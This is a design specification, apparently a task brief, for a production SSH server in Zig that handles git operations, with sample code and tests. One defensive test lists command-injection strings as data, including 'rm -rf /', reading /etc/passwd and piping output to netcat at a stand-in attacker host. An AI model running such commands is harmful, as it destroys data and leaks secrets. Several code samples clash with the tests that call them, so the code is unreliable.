# Production-Grade SSH Server Implementation (Enhanced)

## Overview

Implement a production-ready SSH server in Zig that handles git operations over SSH protocol. The server will wrap a mature C SSH library (details forthcoming) for protocol handling while implementing all server logic, authentication, session management, and git integration in pure Zig. The server must authenticate users via public keys AND certificates, support deploy keys, extract and validate git commands from SSH sessions, and provide enterprise-grade reliability with graceful shutdown, advanced security hardening, and comprehensive monitoring.

## Architectural Approach

Based on comprehensive research of Zig's ecosystem, this implementation will use a hybrid approach:
- **SSH Protocol Layer**: Wrap a battle-tested C library (e.g., libssh2) for SSH transport, key exchange, and encryption
- **Server Logic**: Pure Zig for networking, concurrency, authentication, session management, and git integration
- **Memory Management**: Leverage Zig's allocator system with per-connection arenas for safety and performance
- **Concurrency Model**: Event-driven architecture using Zig's async/await with explicit event loop management

## Core Requirements

### 1. SSH Server Core

Create a configurable SSH server that can:
- Listen on configurable host and port using `std.net.StreamServer` or direct `std.posix` APIs
- Configure SSH library settings for ciphers, key exchanges, and MACs
- Load pre-generated SSH host keys (RSA, ECDSA, Ed25519) from filesystem
- Handle graceful shutdown with connection draining using signal handlers
- Implement per-write and per-KB timeouts for DoS protection
- Support proxy protocol for load balancer integration
- Use `SO_REUSEADDR` for quick server restarts
- Manage a central event loop for async I/O operations

### 2. Authentication Methods

#### Public Key Authentication
- Authenticate users based on public key fingerprints from database
- Support multiple key types: User, Deploy, Principal
- Enforce minimum key sizes per algorithm
- Validate SSH username matches configured git user
- Log all authentication attempts with detailed context
- **Check user status** (is_active, prohibit_login, is_deleted) before granting access
- **Handle repository-specific access** for deploy keys

#### SSH Certificate Authentication
- Support SSH certificates signed by trusted CAs
- Validate certificate principals against allowed values
- Check certificate validity periods
- Support both user and host certificates

### 3. Key Type Support

```zig
pub const KeyType = enum(u8) {
    User = 1,      // Regular user authentication
    Deploy = 2,    // Deploy keys with repository-specific access
    Principal = 3, // Certificate principal keys
};

pub const PublicKey = struct {
    id: i64,
    owner_id: i64,
    name: []const u8,
    fingerprint: []const u8,
    content: []const u8,
    key_type: KeyType,
    mode: AccessMode,        // For deploy keys
    login_source_id: i64,
    verified: bool,
    created_unix: i64,
    updated_unix: i64,
    has_recent_activity: bool,
    has_used_since_last_activity_check: bool,
};
```

### 4. Session & Command Handling

Handle SSH sessions with advanced validation:
- Extract `SSH_ORIGINAL_COMMAND` from session environment
- Parse commands using proper shell quoting rules
- Validate git commands against allowed verbs
- Support LFS authentication commands
- Handle special commands (AGit flow, ssh_info)
- Set up environment variables (`GIT_PROTOCOL`, `GITEA_PROTO`, etc.)
- Handle session I/O streams with per-write timeouts
- Clean session termination with proper exit codes
- **Integrate with permission system** to check repository access before executing commands
- **Pass user context** to git commands for permission checking

### 5. Security Hardening

#### Key Validation
```zig
pub const KeySizeValidator = struct {
    minimum_key_sizes: std.StringHashMap(u32),
    minimum_key_size_check: bool = true,
    
    pub fn getDefaultMinimumSizes() std.StringHashMap(u32) {
        // Gitea's default minimum sizes
        return .{
            .{ "ed25519", 256 },
            .{ "ed25519-sk", 256 },
            .{ "ecdsa", 256 },
            .{ "ecdsa-sk", 256 },
            .{ "rsa", 3071 },
        };
    }
};
```

#### Advanced Security Features

**Rate Limiting with std.AutoHashMap**:
```zig
pub const RateLimiter = struct {
    const RateLimitEntry = struct {
        first_attempt: std.time.Instant,
        attempts: u32,
    };
    
    entries: std.AutoHashMap(std.net.Address, RateLimitEntry),
    mutex: std.Thread.Mutex,
    config: Config,
    
    pub fn checkAllowed(self: *RateLimiter, addr: std.net.Address) !bool {
        self.mutex.lock();
        defer self.mutex.unlock();
        
        const now = std.time.Instant.now() catch unreachable;
        
        if (self.entries.get(addr)) |*entry| {
            const elapsed = now.since(entry.first_attempt);
            if (elapsed > self.config.window_ns) {
                // Reset window
                entry.first_attempt = now;
                entry.attempts = 1;
                return true;
            }
            
            entry.attempts += 1;
            return entry.attempts <= self.config.max_attempts;
        } else {
            // New entry
            try self.entries.put(addr, .{
                .first_attempt = now,
                .attempts = 1,
            });
            return true;
        }
    }
};
```

**Connection Tracking with std.atomic**:
```zig
pub const ConnectionTracker = struct {
    active_connections: std.atomic.Atomic(u32) = .{ .value = 0 },
    max_connections: u32,
    
    pub fn tryAdd(self: *ConnectionTracker) bool {
        const current = self.active_connections.load(.monotonic);
        if (current >= self.max_connections) return false;
        
        _ = self.active_connections.fetchAdd(1, .monotonic);
        return true;
    }
    
    pub fn remove(self: *ConnectionTracker) void {
        _ = self.active_connections.fetchSub(1, .monotonic);
    }
};
```

### 6. Command Validation

```zig
pub const GitCommandValidator = struct {
    pub fn isAllowedVerb(verb: []const u8) bool {
        return std.mem.eql(u8, verb, "git-upload-pack") or
               std.mem.eql(u8, verb, "git-receive-pack") or
               std.mem.eql(u8, verb, "git-upload-archive") or
               std.mem.eql(u8, verb, "git-lfs-authenticate") or
               std.mem.eql(u8, verb, "git-lfs-transfer");
    }
    
    pub fn parseCommand(cmd: []const u8) !ParsedCommand {
        // Handle special commands first
        if (std.mem.eql(u8, cmd, "ssh_info")) {
            return ParsedCommand{ .special = .{ .type = "agit", .version = 1 } };
        }
        
        // Parse using shell quoting rules
        const args = try shellquote.split(cmd);
        if (args.len < 2) return error.InvalidCommand;
        
        const verb = args[0];
        if (!isAllowedVerb(verb)) {
            return error.InvalidCommand;
        }
        
        return ParsedCommand{
            .git = .{
                .verb = verb,
                .repo_path = args[1],
                .lfs_verb = if (args.len > 2) args[2] else null,
            },
        };
    }
};
```

## File Structure

```
src/ssh/
├── server.zig          // Main SSH server implementation with event loop
├── auth.zig            // Public key authentication using database lookups
├── certificate.zig     // SSH certificate support
├── session.zig         // SSH session handling with process management
├── command.zig         // Command extraction and validation
├── security.zig        // Rate limiting with std.AutoHashMap and connection tracking
├── host_key.zig        // Host key loading and management
├── shutdown.zig        // Graceful shutdown with signal handling
├── key_validator.zig   // Key size and type validation
├── deploy_key.zig      // Deploy key specific logic
├── shellquote.zig      // Shell quote parsing
├── ssh_wrapper.zig     // C library wrapper and FFI definitions
└── event_loop.zig      // Central async event loop management
```

## Critical Implementation Details

### Socket Configuration for Production

```zig
// Essential for high-availability deployments
const listener_fd = try std.posix.socket(address.any.family, std.posix.SOCK.STREAM, 0);
errdefer std.posix.close(listener_fd);

// Allow immediate reuse of address after restart
try std.posix.setsockopt(
    listener_fd,
    std.posix.SOL.SOCKET,
    std.posix.SO.REUSEADDR,
    &std.mem.toBytes(@as(c_int, 1)),
);

try std.posix.bind(listener_fd, &address.any, address.getOsSockLen());
try std.posix.listen(listener_fd, 128); // Common backlog size
```

### Graceful Shutdown Pattern

The critical issue: `accept()` is not interrupted by signals in Zig by default. Solution:

```zig
var shutdown_requested = std.atomic.Atomic(bool).init(false);
var listener_fd_global: std.posix.fd_t = undefined; // Accessible to signal handler

fn sigtermHandler(signum: c_int) callconv(.C) void {
    _ = signum;
    shutdown_requested.store(true, .release);
    // CRITICAL: Close listener to unblock accept()
    std.posix.close(listener_fd_global);
}

// In main():
const sa = std.posix.Sigaction{
    .handler = .{ .handler = sigtermHandler },
    .mask = std.posix.empty_sigset,
    .flags = 0, // No SA_RESTART
};
try std.posix.sigaction(std.posix.SIG.TERM, &sa, null);
try std.posix.sigaction(std.posix.SIG.INT, &sa, null);

// In accept loop:
while (!shutdown_requested.load(.acquire)) {
    const conn = server.accept() catch |err| {
        if (shutdown_requested.load(.acquire)) break; // Expected during shutdown
        return err;
    };
    // Handle connection...
}
```

## Implementation Guidelines

### Memory Management Strategy

Use a hierarchical allocator pattern for safety and performance:

1. **Global Allocator**: A single `std.heap.GeneralPurposeAllocator` for server-lifetime resources
   - Wrap in `std.heap.ThreadSafeAllocator` if using helper threads
   - Used for `RateLimiter`, `ConnectionTracker`, and other global state

2. **Per-Connection Arena**: Create `std.heap.ArenaAllocator` for each connection
   - All session-related allocations use this arena
   - Single `arena.deinit()` call frees all connection memory
   - Eliminates per-session memory leaks

### Event Loop Architecture

Since Zig's async is not a runtime but a language feature, implement an explicit event loop:

```zig
// Set at root to enable non-blocking I/O
pub const io_mode = .evented;

pub const EventLoop = struct {
    allocator: std.mem.Allocator,
    poll_fds: std.ArrayList(std.posix.pollfd),
    
    pub fn run(self: *EventLoop) !void {
        while (!shutdown_requested.load(.acquire)) {
            // Poll all file descriptors
            const ready_count = try std.posix.poll(self.poll_fds.items, 100); // 100ms timeout
            
            // Process ready file descriptors
            for (self.poll_fds.items) |*pfd| {
                if (pfd.revents & std.posix.POLL.IN != 0) {
                    // Handle readable fd
                }
            }
        }
    }
};
```

### Enhanced SSH Server Structure

```zig
pub const SshServer = struct {
    config: SshConfig,
    db: *DataAccessObject,
    allocator: std.mem.Allocator, // Global server-lifetime allocator
    listener: std.net.StreamServer,
    shutdown_manager: ShutdownManager,
    rate_limiter: RateLimiter,
    connection_tracker: ConnectionTracker, // Uses std.atomic counter
    host_key_manager: HostKeyManager,
    key_validator: KeySizeValidator,
    certificate_validator: CertificateValidator,
    permission_cache: PermissionCache,
    ssh_context: *SshLibraryContext, // Wrapper around C SSH library context
    
    pub fn handleConnection(self: *SshServer, conn: std.net.StreamServer.Connection) void {
        // Create per-connection arena allocator
        var arena = std.heap.ArenaAllocator.init(self.allocator);
        defer arena.deinit(); // Guarantees all session memory is freed
        const conn_allocator = arena.allocator();
        
        // Handle connection with proper error logging
        self.handleConnectionInner(conn_allocator, conn) catch |err| {
            std.log.warn("Connection from {any} failed: {}", .{ conn.address, err });
        };
    }
    
    fn handleConnectionInner(self: *SshServer, allocator: std.mem.Allocator, conn: std.net.StreamServer.Connection) !void {
        // Handle proxy protocol if enabled
        const real_addr = if (self.config.use_proxy_protocol)
            try self.parseProxyProtocol(allocator, conn.stream)
        else
            conn.address;
            
        // Rate limit check
        if (!try self.rate_limiter.checkAllowed(real_addr)) {
            self.logConnectionFailure(real_addr, error.RateLimitExceeded);
            return error.RateLimitExceeded;
        }
        
        // Track connection atomically
        _ = self.connection_tracker.active_connections.fetchAdd(1, .monotonic);
        defer _ = self.connection_tracker.active_connections.fetchSub(1, .monotonic);
        
        // Calculate dynamic timeout
        const timeout = self.calculateWriteTimeout(0);
        try conn.stream.setWriteTimeout(timeout);
        
        // Create SSH session using C library wrapper
        var session = try SshSession.init(allocator, conn.stream, self.ssh_context, &self.config);
        defer session.deinit();
        
        try self.handleSession(allocator, &session);
    }
    
    fn calculateWriteTimeout(self: *const SshServer, data_size_kb: u64) std.time.Duration {
        const base = std.time.ns_per_s * self.config.per_write_timeout_seconds;
        const per_kb = std.time.ns_per_ms * self.config.per_write_per_kb_timeout_ms;
        return base + (per_kb * data_size_kb);
    }
};
```

### Enhanced Authentication Flow

```zig
pub const SshAuthenticator = struct {
    db: *DataAccessObject,
    key_validator: *KeySizeValidator,
    certificate_validator: *CertificateValidator,
    
    pub fn authenticate(
        self: *SshAuthenticator,
        allocator: std.mem.Allocator,
        auth_data: AuthData,
        username: []const u8,
        remote_addr: []const u8,
    ) !AuthResult {
        // Validate username first
        if (!std.mem.eql(u8, username, self.config.builtin_server_user)) {
            self.logAuthFailure(remote_addr, username, null, .invalid_username);
            return AuthResult{ .failed = .invalid_username };
        }
        
        switch (auth_data) {
            .public_key => |key_data| {
                // Validate key size first
                try self.key_validator.validateKey(key_data);
                
                // Calculate fingerprint
                const fingerprint = try calculateSSHFingerprint(allocator, key_data);
                defer allocator.free(fingerprint);
                
                // Lookup in database
                const key = try self.db.getPublicKeyByFingerprint(allocator, fingerprint) orelse {
                    self.logAuthFailure(remote_addr, username, fingerprint, .key_not_found);
                    return AuthResult{ .failed = .key_not_found };
                };
                defer key.deinit(allocator);
                
                // Check key type specific logic
                switch (key.key_type) {
                    .User => {
                        // Verify user is active
                        const user = try self.db.getUserById(allocator, key.owner_id) orelse {
                            self.logAuthFailure(remote_addr, username, fingerprint, .user_not_found);
                            return AuthResult{ .failed = .user_not_found };
                        };
                        defer user.deinit(allocator);
                        
                        if (!user.is_active or user.prohibit_login) {
                            self.logAuthFailure(remote_addr, username, fingerprint, .user_disabled);
                            return AuthResult{ .failed = .user_disabled };
                        }
                        
                        self.logAuthSuccess(remote_addr, username, fingerprint, .User);
                        return AuthResult{ .success = .{ .user_id = key.owner_id, .key_id = key.id, .key_type = .User } };
                    },
                    .Deploy => {
                        // Deploy keys need repository ID from command for access validation
                        self.logAuthSuccess(remote_addr, username, fingerprint, .Deploy);
                        return AuthResult{ .success = .{ .user_id = key.owner_id, .key_id = key.id, .key_type = .Deploy, .mode = key.mode, .deploy_key_id = key.id } };
                    },
                    .Principal => {
                        // Principal keys require certificate
                        self.logAuthFailure(remote_addr, username, fingerprint, .principal_requires_certificate);
                        return AuthResult{ .failed = .principal_requires_certificate };
                    },
                }
            },
            .certificate => |cert_data| {
                // Validate certificate
                const cert = try self.certificate_validator.validate(allocator, cert_data) orelse {
                    self.logAuthFailure(remote_addr, username, null, .certificate_invalid);
                    return AuthResult{ .failed = .certificate_invalid };
                };
                defer cert.deinit(allocator);
                
                // Check principal
                const allowed_principal = try self.checkAllowedPrincipal(allocator, cert, username);
                if (!allowed_principal) {
                    self.logAuthFailure(remote_addr, username, cert.key_id, .principal_not_allowed);
                    return AuthResult{ .failed = .principal_not_allowed };
                }
                
                self.logAuthSuccess(remote_addr, username, cert.key_id, .Principal);
                return AuthResult{ .success = .{ .user_id = cert.user_id, .key_id = null, .key_type = .Principal } };
            },
        }
    }
    
    fn logAuthSuccess(self: *SshAuthenticator, remote_addr: []const u8, username: []const u8, fingerprint: []const u8, key_type: KeyType) void {
        switch (key_type) {
            .Deploy => std.log.info("SSH: Deploy key authentication success from {s} (fingerprint: {s})", .{ remote_addr, fingerprint }),
            .Principal => std.log.info("SSH: Principal authentication success from {s} (fingerprint: {s})", .{ remote_addr, fingerprint }),
            .User => std.log.info("SSH: User authentication success from {s} (fingerprint: {s})", .{ remote_addr, fingerprint }),
        }
    }
    
    fn logAuthFailure(self: *SshAuthenticator, remote_addr: []const u8, username: []const u8, fingerprint: ?[]const u8, reason: AuthFailureReason) void {
        switch (reason) {
            .invalid_username => {
                std.log.warn("Invalid SSH username {s} - must use {s} for all git operations via ssh", .{ username, self.config.builtin_server_user });
                std.log.warn("Failed authentication attempt from {s}", .{remote_addr});
            },
            .key_not_found => {
                std.log.warn("Unknown public key: {s} from {s}", .{ fingerprint.?, remote_addr });
                std.log.warn("Failed authentication attempt from {s}", .{remote_addr});
            },
            .certificate_invalid => {
                std.log.err("Invalid Certificate presented from {s}", .{remote_addr});
                std.log.warn("Failed authentication attempt from {s}", .{remote_addr});
            },
            else => {
                std.log.warn("Authentication failed from {s}: {}", .{ remote_addr, reason });
                std.log.warn("Failed authentication attempt from {s}", .{remote_addr});
            },
        }
    }
};
```

### Certificate Support

```zig
pub const SshCertificate = struct {
    cert_type: CertType,
    valid_principals: [][]const u8,
    signature_key: []const u8,
    key_id: []const u8,
    valid_after: i64,
    valid_before: i64,
    critical_options: std.StringHashMap([]const u8),
    extensions: std.StringHashMap([]const u8),
};

pub const CertificateValidator = struct {
    trusted_ca_keys: [][]const u8,
    allowed_principals: [][]const u8,
    
    pub fn validate(self: *CertificateValidator, allocator: std.mem.Allocator, cert_data: []const u8) !?SshCertificate {
        const cert = try parseCertificate(allocator, cert_data);
        errdefer cert.deinit(allocator);
        
        // Verify signature against trusted CAs
        var valid_ca = false;
        for (self.trusted_ca_keys) |ca_key| {
            if (try verifyCertificateSignature(cert, ca_key)) {
                valid_ca = true;
                break;
            }
        }
        if (!valid_ca) return null;
        
        // Check validity period
        const now = std.time.timestamp();
        if (now < cert.valid_after or now > cert.valid_before) {
            return null;
        }
        
        // Verify cert type
        if (cert.cert_type != .User) {
            return null;
        }
        
        return cert;
    }
};
```

## Enhanced Configuration

```zig
pub const SshConfig = struct {
    // Basic settings
    host: []const u8 = "0.0.0.0",
    port: u16 = 22,
    builtin_server_user: []const u8 = "git",
    root_path: []const u8 = "~/.ssh",
    
    // Host keys
    server_host_keys: [][]const u8 = &.{"ssh/gitea.rsa", "ssh/gogs.rsa", "ssh/ed25519", "ssh/ecdsa"},
    
    // Connection limits
    max_connections: u32 = 1000,
    max_connections_per_ip: u32 = 10,
    
    // Timeouts
    auth_timeout_seconds: u32 = 60,
    connection_timeout_seconds: u32 = 300,
    graceful_shutdown_timeout_seconds: u32 = 30,
    per_write_timeout_seconds: u32 = 30,
    per_write_per_kb_timeout_ms: u32 = 10,
    
    // Rate limiting
    rate_limit_window_seconds: u32 = 300,
    rate_limit_max_attempts: u32 = 10,
    
    // Security
    minimum_key_size_check: bool = true,
    minimum_key_sizes: ?std.StringHashMap(u32) = null, // Use defaults if null
    
    // Certificate support
    trusted_user_ca_keys: [][]const u8 = &.{},
    trusted_user_ca_keys_file: ?[]const u8 = null,
    authorized_principals_allow: [][]const u8 = &.{"username", "email"},
    authorized_principals_enabled: bool = false,
    
    // Proxy support
    use_proxy_protocol: bool = false,
    
    // Authorized keys management
    authorized_keys_backup: bool = false,
    create_authorized_keys_file: bool = true,
    expose_anonymous: bool = false,
    
    // Ciphers and algorithms
    ciphers: []const []const u8 = &.{
        "chacha20-poly1305@openssh.com",
        "aes256-gcm@openssh.com",
        "aes128-gcm@openssh.com",
        "aes256-ctr",
        "aes192-ctr",
        "aes128-ctr",
    },
    key_exchanges: []const []const u8 = &.{
        "curve25519-sha256",
        "curve25519-sha256@libssh.org",
        "ecdh-sha2-nistp256",
        "ecdh-sha2-nistp384",
        "ecdh-sha2-nistp521",
        "diffie-hellman-group14-sha256",
    },
    macs: []const []const u8 = &.{
        "umac-128-etm@openssh.com",
        "hmac-sha2-256-etm@openssh.com",
        "hmac-sha2-256",
    },
};
```

## Integration Points

### Permission System Integration
- Import and use the permission system from `src/permission.zig`
- Create a `SecurityContext` for each authenticated session
- Check repository permissions before executing git commands
- Handle deploy key permissions specially (repository-specific access)
- Pass user context through the git command execution chain

### Session Management with Process Integration

```zig
pub const SshSession = struct {
    allocator: std.mem.Allocator, // Per-connection arena
    stream: std.net.Stream,
    ssh_session: *c.ssh_session, // C library session handle
    user_id: i64,
    key_id: ?i64,
    key_type: KeyType,
    security_ctx: *SecurityContext,
    environment: std.process.EnvMap,
    
    pub fn execute(self: *SshSession, command: []const u8) !i32 {
        // Parse and validate command
        const parsed = try GitCommandValidator.parseCommand(command);
        
        // Check repository access
        const repo_path = parsed.git.repo_path;
        const access_mode: AccessMode = if (std.mem.eql(u8, parsed.git.verb, "git-receive-pack")) .Write else .Read;
        
        const repo_id = try self.resolveRepoPath(repo_path);
        if (access_mode == .Write) {
            try self.security_ctx.requireRepoWrite(repo_id, .Code);
        } else {
            try self.security_ctx.requireRepoRead(repo_id, .Code);
        }
        
        // Spawn git process
        var child = std.process.Child.init(&.{parsed.git.verb, repo_path}, self.allocator);
        child.stdin_behavior = .Pipe;
        child.stdout_behavior = .Pipe;
        child.stderr_behavior = .Pipe;
        child.env_map = &self.environment;
        
        try child.spawn();
        errdefer _ = child.kill();
        
        // CRITICAL: Wait for execve to complete
        try child.waitForSpawn();
        
        // Get pipes for I/O proxying
        const child_stdin = child.stdin.?.writer();
        const child_stdout = child.stdout.?.reader();
        
        // TODO: Integrate with event loop for I/O proxying
        
        const result = try child.wait();
        return result.Exited;
    }
};
```

## Testing Strategy

### Advanced Testing Techniques

1. **Memory Error Testing with FailingAllocator**:
```zig
test "server handles OOM gracefully" {
    const allocator = testing.allocator;
    
    // Test every allocation failure path
    var fail_index: usize = 0;
    while (fail_index < 100) : (fail_index += 1) {
        var failing_allocator = std.testing.FailingAllocator.init(
            allocator,
            .{ .fail_index = fail_index }
        );
        
        var server = SshServer.init(failing_allocator.allocator()) catch {
            // Expected failure, verify cleanup
            continue;
        };
        defer server.deinit();
        
        // If we got here, all allocations succeeded
        break;
    }
}
```

2. **Protocol Testing with Fixed Buffer Streams**:
```zig
test "SSH protocol handling" {
    const allocator = testing.allocator;
    
    // Create in-memory streams for testing
    var server_input_buf: [4096]u8 = undefined;
    var server_output_buf: [4096]u8 = undefined;
    
    var server_in = std.io.fixedBufferStream(&server_input_buf);
    var server_out = std.io.fixedBufferStream(&server_output_buf);
    
    // Write pre-canned SSH packets to server input
    try server_in.writer().writeAll(ssh_version_exchange);
    try server_in.writer().writeAll(ssh_kexinit_packet);
    
    // Test server response
    var session = try SshSession.init(allocator, server_in.reader(), server_out.writer());
    defer session.deinit();
    
    // Verify correct protocol response
    const response = server_out.getWritten();
    try testing.expect(std.mem.startsWith(u8, response, "SSH-2.0-"));
}
```

### Comprehensive Test Coverage

```zig
// Key validation tests
test "minimum key size enforcement" {
    const allocator = testing.allocator;
    var validator = KeySizeValidator.init(allocator);
    defer validator.deinit();
    
    // Test weak RSA key (2048 bits) - should fail
    const weak_rsa = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..."; // 2048-bit key
    try testing.expectError(error.KeyTooWeak, validator.validateKey(weak_rsa));
    
    // Test strong RSA key (4096 bits) - should pass
    const strong_rsa = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC..."; // 4096-bit key
    try validator.validateKey(strong_rsa);
}

// Certificate authentication tests
test "SSH certificate authentication with trusted CA" {
    const allocator = testing.allocator;
    var validator = CertificateValidator.init(allocator, trusted_ca_keys);
    defer validator.deinit();
    
    const cert_data = try generateTestCertificate(allocator, ca_key, "test-user", .User);
    defer allocator.free(cert_data);
    
    const cert = try validator.validate(allocator, cert_data);
    try testing.expect(cert != null);
}

test "SSH certificate with untrusted CA" {
    const allocator = testing.allocator;
    var validator = CertificateValidator.init(allocator, trusted_ca_keys);
    defer validator.deinit();
    
    const untrusted_ca = try generateTestKeyPair(allocator);
    const cert_data = try generateTestCertificate(allocator, untrusted_ca.private, "test-user", .User);
    defer allocator.free(cert_data);
    
    const cert = try validator.validate(allocator, cert_data);
    try testing.expect(cert == null);
}

// Deploy key tests
test "deploy key vs user key handling" {
    const allocator = testing.allocator;
    var auth = try createTestAuthenticator(allocator);
    defer auth.deinit();
    
    // Test user key
    const user_result = try auth.authenticate(allocator, .{ .public_key = user_key }, "git", "127.0.0.1");
    try testing.expect(user_result == .success);
    try testing.expect(user_result.success.key_type == .User);
    
    // Test deploy key
    const deploy_result = try auth.authenticate(allocator, .{ .public_key = deploy_key }, "git", "127.0.0.1");
    try testing.expect(deploy_result == .success);
    try testing.expect(deploy_result.success.key_type == .Deploy);
    try testing.expect(deploy_result.success.mode == .Read); // Deploy key has read-only access
}

// Command validation tests
test "git command validation and LFS support" {
    const allocator = testing.allocator;
    
    // Valid git commands
    try testing.expect(GitCommandValidator.isAllowedVerb("git-upload-pack"));
    try testing.expect(GitCommandValidator.isAllowedVerb("git-receive-pack"));
    try testing.expect(GitCommandValidator.isAllowedVerb("git-upload-archive"));
    try testing.expect(GitCommandValidator.isAllowedVerb("git-lfs-authenticate"));
    try testing.expect(GitCommandValidator.isAllowedVerb("git-lfs-transfer"));
    
    // Invalid commands
    try testing.expect(!GitCommandValidator.isAllowedVerb("rm"));
    try testing.expect(!GitCommandValidator.isAllowedVerb("cat"));
}

test "shell quote parsing edge cases" {
    const allocator = testing.allocator;
    
    // Test various quoting scenarios
    const test_cases = .{
        .{ "git-upload-pack '/repo.git'", &.{ "git-upload-pack", "/repo.git" } },
        .{ "git-receive-pack \"/repo with spaces.git\"", &.{ "git-receive-pack", "/repo with spaces.git" } },
        .{ "git-upload-pack /repo\\'s.git", &.{ "git-upload-pack", "/repo's.git" } },
        .{ "git-lfs-authenticate '/repo.git' download", &.{ "git-lfs-authenticate", "/repo.git", "download" } },
    };
    
    inline for (test_cases) |tc| {
        const parsed = try shellquote.split(allocator, tc[0]);
        defer allocator.free(parsed);
        try testing.expectEqualSlices([]const u8, tc[1], parsed);
    }
}

// Timeout tests
test "per-write timeout with large data transfer" {
    const allocator = testing.allocator;
    var server = try createTestServer(allocator);
    defer server.deinit();
    
    // Test timeout calculation
    const timeout_1mb = server.calculateWriteTimeout(1024); // 1MB
    const timeout_10mb = server.calculateWriteTimeout(10240); // 10MB
    
    try testing.expect(timeout_10mb > timeout_1mb);
    try testing.expectEqual(30 * std.time.ns_per_s + 10 * 1024 * std.time.ns_per_ms, timeout_1mb);
}

// Proxy protocol tests
test "proxy protocol header parsing" {
    const allocator = testing.allocator;
    var server = try createTestServerWithProxy(allocator);
    defer server.deinit();
    
    const proxy_header = "PROXY TCP4 192.168.1.1 10.0.0.1 56324 22\r\n";
    const real_addr = try server.parseProxyProtocol(allocator, proxy_header);
    defer allocator.free(real_addr);
    
    try testing.expectEqualStrings("192.168.1.1:56324", real_addr);
}

// Special command tests
test "AGit flow special commands" {
    const allocator = testing.allocator;
    
    const result = try GitCommandValidator.parseCommand("ssh_info");
    try testing.expect(result == .special);
    try testing.expectEqualStrings("agit", result.special.type);
    try testing.expectEqual(@as(u32, 1), result.special.version);
}

// Security tests
test "malformed SSH command injection" {
    const allocator = testing.allocator;
    
    // Test command injection attempts
    const malicious_commands = .{
        "git-upload-pack /repo.git; rm -rf /",
        "git-upload-pack /repo.git && cat /etc/passwd",
        "git-upload-pack /repo.git | nc attacker.com 1234",
        "git-upload-pack /repo.git`whoami`",
    };
    
    for (malicious_commands) |cmd| {
        const result = GitCommandValidator.parseCommand(cmd);
        // Should either error or parse safely without executing injected commands
        if (result) |parsed| {
            try testing.expect(parsed.git.repo_path[0] == '/');
            try testing.expect(std.mem.indexOf(u8, parsed.git.repo_path, ";") == null);
            try testing.expect(std.mem.indexOf(u8, parsed.git.repo_path, "&") == null);
            try testing.expect(std.mem.indexOf(u8, parsed.git.repo_path, "|") == null);
            try testing.expect(std.mem.indexOf(u8, parsed.git.repo_path, "`") == null);
        } else |err| {
            try testing.expect(err == error.InvalidCommand);
        }
    }
}

// Connection limit tests
test "concurrent connection limit enforcement" {
    const allocator = testing.allocator;
    var tracker = ConnectionTracker.init(allocator, 5); // Max 5 connections
    defer tracker.deinit();
    
    // Add 5 connections - should succeed
    var connections: [5]?Connection = undefined;
    for (&connections, 0..) |*conn, i| {
        const addr = try std.fmt.allocPrint(allocator, "192.168.1.{}", .{i});
        defer allocator.free(addr);
        conn.* = try tracker.tryAdd(allocator, addr);
        try testing.expect(conn.* != null);
    }
    
    // Try to add 6th connection - should fail
    const conn6 = try tracker.tryAdd(allocator, "192.168.1.100");
    try testing.expect(conn6 == null);
    
    // Remove one connection
    tracker.remove(connections[0].?);
    
    // Now we can add another
    const conn7 = try tracker.tryAdd(allocator, "192.168.1.101");
    try testing.expect(conn7 != null);
}

// Rate limiting tests
test "authentication failure rate limiting" {
    const allocator = testing.allocator;
    var limiter = RateLimiter.init(allocator, .{
        .window_seconds = 300,
        .max_attempts = 3,
    });
    defer limiter.deinit();
    
    const test_ip = "192.168.1.100";
    
    // First 3 attempts should succeed
    for (0..3) |_| {
        try testing.expect(try limiter.checkAllowed(test_ip));
        limiter.recordAttempt(test_ip, false); // Record failure
    }
    
    // 4th attempt should be rate limited
    try testing.expect(!try limiter.checkAllowed(test_ip));
}

// Graceful shutdown tests
test "graceful shutdown with active connections" {
    const allocator = testing.allocator;
    var server = try createTestServer(allocator);
    defer server.deinit();
    
    // Start server in background
    const thread = try std.Thread.spawn(.{}, serverThread, .{&server});
    
    // Create multiple connections
    var clients: [10]SshClient = undefined;
    for (&clients) |*client| {
        client.* = try SshClient.connect(allocator, "127.0.0.1", test_port);
    }
    
    // Request shutdown
    server.shutdown_manager.requestShutdown();
    
    // Verify no new connections accepted
    const new_client = SshClient.connect(allocator, "127.0.0.1", test_port);
    try testing.expectError(error.ConnectionRefused, new_client);
    
    // Close existing connections
    for (&clients) |*client| {
        client.close();
    }
    
    // Wait for shutdown
    thread.join();
    
    // Verify clean shutdown
    try testing.expect(server.connection_tracker.count() == 0);
}

// Permission integration tests
test "SSH session with permission checks" {
    const allocator = testing.allocator;
    var server = try createTestServer(allocator);
    defer server.deinit();
    
    // Create test user and repository
    const user_id = try createTestUser(allocator, server.db, "testuser");
    const repo_id = try createTestRepo(allocator, server.db, user_id, "test-repo", .Private);
    
    // Authenticate with user key
    var auth = SshAuthenticator{ .db = server.db, .key_validator = &server.key_validator };
    const auth_result = try auth.authenticate(allocator, .{ .public_key = test_key }, "git", "127.0.0.1");
    
    // Create session context with security
    var security_ctx = try SecurityContext.init(allocator, server.db, &server.permission_cache, auth_result.success.user_id);
    var session_ctx = SessionContext{
        .user_id = auth_result.success.user_id,
        .key_id = auth_result.success.key_id,
        .key_type = auth_result.success.key_type,
        .deploy_key_id = null,
        .security_ctx = &security_ctx,
    };
    
    // Test repository access
    try session_ctx.checkRepoAccess("/testuser/test-repo.git", .Read);
    try session_ctx.checkRepoAccess("/testuser/test-repo.git", .Write);
    
    // Test access to another user's repo fails
    const other_repo_id = try createTestRepo(allocator, server.db, 999, "other-repo", .Private);
    try testing.expectError(error.AccessDenied, session_ctx.checkRepoAccess("/other/other-repo.git", .Read));
}

test "deploy key repository-specific access" {
    const allocator = testing.allocator;
    var server = try createTestServer(allocator);
    defer server.deinit();
    
    // Create repositories
    const repo1_id = try createTestRepo(allocator, server.db, 100, "allowed-repo", .Private);
    const repo2_id = try createTestRepo(allocator, server.db, 100, "denied-repo", .Private);
    
    // Create deploy key with access to repo1 only
    const deploy_key_id = try createDeployKey(allocator, server.db, repo1_id, "deploy-key", .Read);
    
    // Authenticate with deploy key
    var auth = SshAuthenticator{ .db = server.db, .key_validator = &server.key_validator };
    const auth_result = try auth.authenticate(allocator, .{ .public_key = deploy_test_key }, "git", "127.0.0.1");
    
    // Create session context
    var session_ctx = SessionContext{
        .user_id = auth_result.success.user_id,
        .key_id = auth_result.success.key_id,
        .key_type = .Deploy,
        .deploy_key_id = auth_result.success.deploy_key_id,
        .security_ctx = undefined, // Deploy keys use different permission path
